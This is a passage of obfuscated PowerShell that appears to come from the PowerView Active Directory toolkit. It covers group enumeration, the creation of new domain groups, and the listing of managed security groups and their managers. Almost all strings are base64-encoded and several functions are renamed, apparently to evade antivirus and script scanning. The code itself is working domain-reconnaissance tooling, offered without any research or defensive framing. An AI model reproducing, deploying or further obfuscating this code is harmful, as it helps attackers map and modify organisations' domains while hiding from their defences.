                            if (${212}) {
                                ${212}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                                ${212}
                            }
                        }
                    }
                }
            }
            else {
                ${251} = ''
                $Filter = ''
                $Identity | ? {$_} | % {
                    ${252} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                    if (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABzAGkAZAA9ACQAewAyADUAMgB9ACkA')))
                    }
                    elseif (${252} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApAA==')))
                        if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                            ${254} = ${252}.SubString(${252}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADIANQA0AH0AJwAgAGYAcgBvAG0AIAAnACQAewAyADUAMgB9ACcA')))
                            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${254}
                            ${386} = f74 @48
                            if (-not ${386}) {
                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAdAByAGkAZQB2AGUAIABkAG8AbQBhAGkAbgAgAHMAZQBhAHIAYwBoAGUAcgAgAGYAbwByACAAJwAkAHsAMgA1ADQAfQAnAA==')))
                            }
                        }
                    }
                    elseif (${252} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                        ${253} = (([Guid]${252}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADIANQAzAH0AKQA=')))
                    }
                    elseif (${252}.Contains('\')) {
                        ${401} = ${252}.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | f111 -f40 Canonical
                        if (${401}) {
                            ${46} = ${401}.SubString(0, ${401}.IndexOf('/'))
                            ${45} = ${252}.Split('\')[1]
                            ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQAkAHsANAA1AH0AKQA=')))
                            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${46}
                            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQB4AHQAcgBhAGMAdABlAGQAIABkAG8AbQBhAGkAbgAgACcAJAB7ADQANgB9ACcAIABmAHIAbwBtACAAJwAkAHsAMgA1ADIAfQAnAA==')))
                            ${386} = f74 @48
                        }
                    }
                    else {
                        ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADIANQAyAH0AKQAoAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApACkA')))
                    }
                }
                if (${251} -and (${251}.Trim() -ne '') ) {
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewAyADUAMQB9ACkA')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))]) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGEAZABtAGkAbgBDAG8AdQBuAHQAPQAxAA==')))
                    $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMAYwBvAHAAZQA=')))]) {
                    ${407} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMAYwBvAHAAZQA=')))]
                    $Filter = Switch (${407}) {
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4ATABvAGMAYQBsAA==')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADQAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQARABvAG0AYQBpAG4ATABvAGMAYQBsAA==')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQA0ACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwA')))            { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQARwBsAG8AYgBhAGwA')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGkAdgBlAHIAcwBhAGwA')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAVQBuAGkAdgBlAHIAcwBhAGwA')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQA4ACkAKQA='))) }
                    }
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHMAYwBvAHAAZQAgACcAJAB7ADQAMAA3AH0AJwA=')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAcgBvAHAAZQByAHQAeQA=')))]) {
                    ${406} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAcgBvAHAAZQByAHQAeQA=')))]
                    $Filter = Switch (${406}) {
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA==')))              { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAMQA0ADcANAA4ADMANgA0ADgAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAdAByAGkAYgB1AHQAaQBvAG4A')))          { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyADEANAA3ADQAOAAzADYANAA4ACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAZABCAHkAUwB5AHMAdABlAG0A')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAQwByAGUAYQB0AGUAZABCAHkAUwB5AHMAdABlAG0A')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxACkAKQA='))) }
                    }
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHAAcgBvAHAAZQByAHQAeQAgACcAJAB7ADQAMAA2AH0AJwA=')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
                ${386}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAJABGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-DomainGroup] filter string: $(${386}.filter)"
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${72} = ${386}.FindOne() }
                else { ${72} = ${386}.FindAll() }
                ${72} | ? {$_} | % {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ${212} = $_
                    }
                    else {
                        ${212} = f104 -Properties $_.Properties
                    }
                    ${212}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                    ${212}
                }
                if (${72}) {
                    try { ${72}.dispose() }
                    catch {
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA=')))
                    }
                }
                ${386}.dispose()
            }
        }
    }
}
function New-DomainGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Description,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${383} = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${383}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${383}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${405} = f110 @383
    if (${405}) {
        ${212} = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList (${405}.Context)
        ${212}.SamAccountName = ${405}.Identity
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))]) {
            ${212}.Name = $Name
        }
        else {
            ${212}.Name = ${405}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) {
            ${212}.DisplayName = $DisplayName
        }
        else {
            ${212}.DisplayName = ${405}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))]) {
            ${212}.Description = $Description
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAGMAcgBlAGEAdABlACAAZwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnAA==')))
        try {
            $Null = ${212}.Save()
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABjAHIAZQBhAHQAZQBkAA==')))
            ${212}
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAZwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnACAAOgAgACQAXwA=')))
        }
    }
}
function Get-DomainManagedSecurityGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${48} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbQBhAG4AYQBnAGUAZABCAHkAPQAqACkAKABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAMQA0ADcANAA4ADMANgA0ADgAKQApAA==')))
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlACwAbQBhAG4AYQBnAGUAZABCAHkALABzAGEAbQBhAGMAYwBvAHUAbgB0AHQAeQBwAGUALABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }
        f70 @48 | % {
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbgBhAG0AZQAsAHMAYQBtAGEAYwBjAG8AdQBuAHQAdAB5AHAAZQAsAHMAYQBtAGEAYwBjAG8AdQBuAHQAbgBhAG0AZQAsAG8AYgBqAGUAYwB0AHMAaQBkAA==')))
            ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $_.managedBy
            $Null = ${48}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA='))))
            ${404} = f98 @48
            ${402} = New-Object PSObject
            ${402} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $_.samaccountname
            ${402} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) $_.distinguishedname
            ${402} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBOAGEAbQBlAA=='))) ${404}.samaccountname
            ${402} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUA'))) ${404}.distinguishedName
            if (${404}.samaccounttype -eq 0x10000000) {
                ${402} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBUAHkAcABlAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))
            }
            elseif (${404}.samaccounttype -eq 0x30000000) {
                ${402} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBUAHkAcABlAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))
            }
            ${403} = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${403}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${402} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBDAGEAbgBXAHIAaQB0AGUA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
            ${402}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBNAGEAbgBhAGcAZQBkAFMAZQBjAHUAcgBpAHQAeQBHAHIAbwB1AHAA'))))
            ${402}
        }
    }
}
function f85 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        ${f20},
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        ${f21},
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${48} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIALABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
